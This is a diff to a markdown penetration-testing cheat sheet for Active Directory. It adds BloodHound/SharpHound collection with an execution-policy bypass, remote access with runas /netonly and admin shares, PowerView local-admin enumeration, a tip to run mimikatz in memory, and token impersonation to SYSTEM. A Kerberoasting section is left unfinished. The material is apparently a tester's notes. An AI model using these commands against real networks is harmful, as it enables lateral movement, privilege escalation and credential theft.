@@ -20,13 +20,31 @@ This will download to a specific folder and with a specific name as specified in
 
 ### BloodHound
 
-Powershell -exec bypass
+BloodHound is a tool for mapping out the entire domain graphically.
 
-Import-module sharphound.ps1
+`Powershell -exec bypass`
 
-Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -SkipPing
+`Import-module sharphound.ps1`
+
+`Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -SkipPing`
 
 ### Remoting
+
+Once a domain user is acquired, a lot can be done in terms of remoting. In AD environments, a shell on a box is barely required given a certain set of criteria. One a domain user as been acquired you can use numerous commands to work remotely on boxes you have access to either through domain or local privileges on the remote box. Windows has three ways of providing authenticated access: credentials, hash or tokens. You can see those differnet types of access below:
+
+If file shares are available on a box you can use dir on the path without ever getting prompted for a password given that you already have a shell as the user you want to authenticate as. This means if you somehow got a shell without credentials or a hash, you still have your token to verify your identity to remote services. See command below for a simple verification.
+
+`dir \\BOX01\c$\`
+
+If you want old school, use [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490994%28v=technet.10%29). /netonly : Indicates that the user information specified is for remote access only.
+
+
+
+`runas /netonly /FQDN\user cmd.exe`
+
+Run the following command to execute powershell on a remote box
+
+`runas /netonly /user:customer\ank powershell`
 
 Using WMIC, check which users have sessions on a remote machine. Local administrator privileges are not necessary to execute this remotely.
 
@@ -45,8 +63,6 @@ Powerview is a super useful set of tools for enumerating a domain. The script an
 [https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 
 In powerview, there is a super useful function called `Find-LocalAdminAccess` which enumerates which machines the current user is local administrator on. This can be very useful, as you can then remotely execute things like mimikatz on those boxes straight into memory to get the credentials of domain users. If you need an overview of what groups and users are local admin on every box in the environment you can use `Invoke-EnumerateLocalAdmin`
-
-
 
 If you want to go hail mary and fuck shit up you can run every single module in Powerview:
 
@@ -90,4 +106,18 @@ Invokes token impersonation on a domain user. If this doesn't work you can try i
 `Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"`
 
 `Get-Process wininit | Invoke-TokenManipulation -CreateProcess "cmd.exe"`
+
+
+
+
+
+### Invoke-Kerberoast
+
+kerberoasting is a technique 
+
+https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
+
+https://room362.com/post/2016/kerberoast-pt1/
+
+
 
